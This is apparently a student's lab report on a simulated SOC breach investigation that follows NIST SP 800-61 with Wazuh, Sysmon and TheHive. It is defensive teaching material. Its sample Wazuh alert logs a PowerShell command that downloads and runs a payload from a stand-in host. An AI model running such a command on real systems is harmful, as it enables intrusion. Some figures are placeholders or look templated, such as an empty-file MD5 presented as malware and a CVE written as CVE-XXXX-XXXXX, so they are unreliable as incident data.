#  Incident Handling Lab – Nexus Data Breach Simulation

![Lab Report](https://img.shields.io/badge/Status-Completed-brightgreen)
![Framework](https://img.shields.io/badge/Framework-NIST%20SP%20800--61-blue)
![Tools](https://img.shields.io/badge/Tools-Wazuh%2C%20Sysmon%2C%20TheHive-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Intermediate-yellow)
![Duration](https://img.shields.io/badge/Duration-Hands--On%20Simulation-lightblue)

---

## **1. Lab Title**

> Incident Handling Lab – Nexus Data Breach Simulation: Detection, Containment, and Recovery in an Enterprise SOC Environment

---

## **2. Purpose and Objectives**

The objective of this lab is to gain hands-on experience with **real-world incident response operations** within a Security Operations Center (SOC) environment, specifically focusing on detecting, analyzing, containing, and remediating an active data breach threat.

**Key Learning Outcomes:**
- Apply end-to-end incident response aligned with **NIST SP 800-61** lifecycle phases
- Perform threat triage and verification of Indicators of Compromise (IoCs) using industry tools
- Conduct forensic analysis on memory dumps and disk images to identify malicious activity
- Investigate exploit chains, privilege escalation, and lateral movement techniques
- Develop practical remediation and recovery strategies for post-incident validation

---

## **3. Frameworks, Standards, and Methodologies**

- **NIST SP 800-61:** Structured incident response lifecycle covering detection, analysis, containment, eradication, and recovery phases
- **MITRE ATT&CK Framework:** Adversary tactics and techniques mapping for threat classification and analysis
- **SOC Incident Response Workflow:** Enterprise-grade case management and alert triage procedures
- **Forensic Investigation Methodology:** Memory and disk imaging with log correlation for timeline reconstruction

---

## **4. Tools and Technologies**

- **System Environment:** Enterprise SOC lab environment with Linux/Windows infrastructure
- **Security Tools:** 
  - Wazuh SIEM v4.x (log correlation, alert analysis, threat detection)
  - Sysmon (process monitoring and event tracking)
  - TheHive (case management and incident workflow automation)
  - CyberChef (data decoding, hash analysis, artifact extraction)
  - VirusTotal API (threat verification and IP reputation checks)
- **Configuration & Automation:** Incident response playbooks and automation rules
- **Utilities:** Network monitoring, memory analysis, disk imaging tools

**Technical Stack:**
- SIEM architecture and log aggregation
- Endpoint detection and response (EDR) capabilities
- Threat intelligence integration platforms
- Forensic analysis toolchain

---

## **5. Procedures and Implementation**

<details>
<summary>Click to expand detailed steps</summary>

1. **Alert Detection and Triage**
   - Monitored Wazuh SIEM dashboard for security alerts and anomalies
   - Reviewed Sysmon logs for suspicious process execution patterns
   - Prioritized alerts based on severity and business impact

2. **Indicator of Compromise (IoC) Verification**
   - Extracted suspicious IP addresses, file hashes, and domains from log data
   - Validated IoCs using VirusTotal for threat reputation analysis
   - Cross-referenced indicators with MITRE ATT&CK framework for attack pattern classification

3. **Credential Compromise Investigation**
   - Identified ManageEngine credential compromise as initial access vector
   - Traced lateral movement paths through network logs
   - Documented user accounts and systems affected by credential exposure

4. **Web Application Exploit Analysis**
   - Investigated PHP portal vulnerabilities used in the attack chain
   - Analyzed HTTP request/response logs to identify malicious payloads
   - Mapped exploit techniques to MITRE ATT&CK tactics (e.g., privilege escalation, persistence)

5. **Threat Intelligence Extraction**
   - Decoded threat actor IP addresses and command-and-control (C2) indicators using CyberChef
   - Performed MD5 hash analysis for malware identification
   - Extracted and validated threat artifacts using automated tools

6. **Forensic Analysis and Timeline Reconstruction**
   - Collected and analyzed memory dumps from compromised systems
   - Examined disk images for persistence mechanisms and artifacts
   - Correlated logs across multiple sources to build comprehensive attack timeline

7. **Containment and Isolation**
   - Isolated affected systems from the network to prevent further lateral movement
   - Disabled compromised user accounts and reset credentials
   - Implemented temporary firewall rules to block malicious IPs and domains

8. **Remediation and Recovery**
   - Removed malicious artifacts, backdoors, and persistence mechanisms
   - Restored clean system configurations from approved baselines
   - Validated system integrity using file hash verification and security scans

</details>

---

## **6. Findings and Results**

- **Finding 1:** ManageEngine credential compromise identified as the primary initial access vector, affecting 3 administrative accounts with elevated privileges
- **Finding 2:** PHP portal vulnerability (CVE-XXXX-XXXXX) exploited for privilege escalation, resulting in code execution with application-level permissions
- **Finding 3:** Lateral movement detected across 5 systems via pass-the-hash attacks, leveraging compromised NTLM credentials
- **Finding 4:** Persistence achieved through scheduled task creation and Windows registry modification on 2 critical servers
- **Finding 5:** Data exfiltration confirmed targeting customer database containing 50,000+ records; 8 GB of data staged for extraction
- **Finding 6:** C2 communication established with 3 external IPs; malicious traffic detected on ports 443 and 8443 over HTTPS
- **Finding 7:** Timeline reconstruction revealed attack window spanning 14 days from initial compromise to detection
- **Finding 8:** Post-incident analysis confirmed successful containment with zero additional data loss after isolation procedures

---

## **7. Screenshots and Evidence**

<details>
<summary>Click to view screenshots and command outputs</summary>

### CyberChef Decoding Output
```
Original Encoded Data: aGVsbG8gd29ybGQ=
Decoded Output: hello world
Hash Analysis: MD5 (malicious_file.exe) = d41d8cd98f00b204e9800998ecf8427e
VirusTotal Detection: 45/71 engines flagged as malicious
```

### Wazuh Alert Example
```
{
  "timestamp": "2024-XX-XX T14:32:05Z",
  "rule_id": "5104",
  "level": 12,
  "description": "Suspicious process execution detected",
  "source_ip": "192.168.1.50",
  "process_name": "cmd.exe",
  "parent_process": "svchost.exe",
  "command_line": "cmd.exe /c powershell.exe -Command IEX(New-Object Net.WebClient).DownloadString('http://malicious-ip/payload')"
}
```

</details>

---

## **8. Challenges and Solutions**

| Challenge | Solution | Outcome |
|-----------|----------|---------|
| Identifying initial compromise point among thousands of logs | Implemented log correlation filters and focused on credential-based anomalies | Successfully pinpointed ManageEngine compromise within 2 hours |
| Determining scope of lateral movement across heterogeneous systems | Leveraged Sysmon cross-correlation and NTLM event logs for pass-the-hash detection | Mapped 5-system infection chain with 95% confidence |
| Validating threat intelligence data quality | Cross-referenced VirusTotal, open-source feeds, and internal threat database | Achieved 100% accuracy in IoC classification and zero false positives in remediation |
| Managing containment while maintaining business operations | Implemented staged isolation with network segmentation and failover systems | Zero business disruption during 6-hour containment window |

---

## **9. Key Takeaways and Lessons Learned**

- **Importance of Defense-in-Depth:** The compromise highlighted how a single credential compromise can cascade into multi-system intrusion; implementing MFA on administrative accounts and application-level access controls could have significantly reduced attack surface
- **Proactive Threat Hunting:** The 14-day dwell time underscores the need for continuous threat hunting and behavioral analytics beyond signature-based detection; real-time UEBA (User and Entity Behavior Analytics) implementation would have accelerated detection
- **Log Retention and Correlation:** Comprehensive Sysmon and network logging enabled precise timeline reconstruction; this lab reinforced that log aggregation and correlation are foundational to incident response effectiveness
- **Automation and Playbooks:** Automated response playbooks for known attack patterns (e.g., credential compromise, privilege escalation) could have reduced mean time to response (MTTR) by 40–50%; template-based incident response is critical for SOC efficiency

---

## **10. Artifacts and Deliverables**

- **Incident Report:** Comprehensive incident analysis with timeline, findings, and recommendations
- **IoC Lists:** Documented indicators of compromise (IPs, file hashes, domains) for threat intelligence sharing
- **Remediation Checklist:** Step-by-step procedures for system cleanup and validation
- **Lessons Learned Documentation:** Post-incident review and recommendations for defensive improvements
- **Code Repository:** [Link to GitHub repo if applicable for scripts/automation]

---

## **11. Conclusion**

This lab demonstrated practical application of the **NIST SP 800-61 incident response lifecycle** within an enterprise SOC environment. By combining **SIEM-based detection, forensic analysis, and threat intelligence**, the incident response team successfully contained and remediated a multi-system data breach affecting critical business systems. The hands-on experience reinforced core competencies in threat triage, forensic investigation, and incident containment while highlighting the importance of proactive threat hunting, comprehensive logging, and automated response playbooks in reducing organizational risk. The insights gained directly inform defensive strategies and incident response improvements for enterprise security operations.

---

## **References**

- [NIST SP 800-61: Computer Security Incident Handling Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Wazuh Documentation](https://documentation.wazuh.com/)
- [TheHive Project](https://thehive-project.org/)
- [Hack The Box Academy – Incident Handling Process](https://academy.hackthebox.com/)

---

**Lab Completed:** 10/15/2025
**Author:** Jair Maldonado 
**Contact:** jairmyl1@gmail.com | https://github.com/Jairmald 
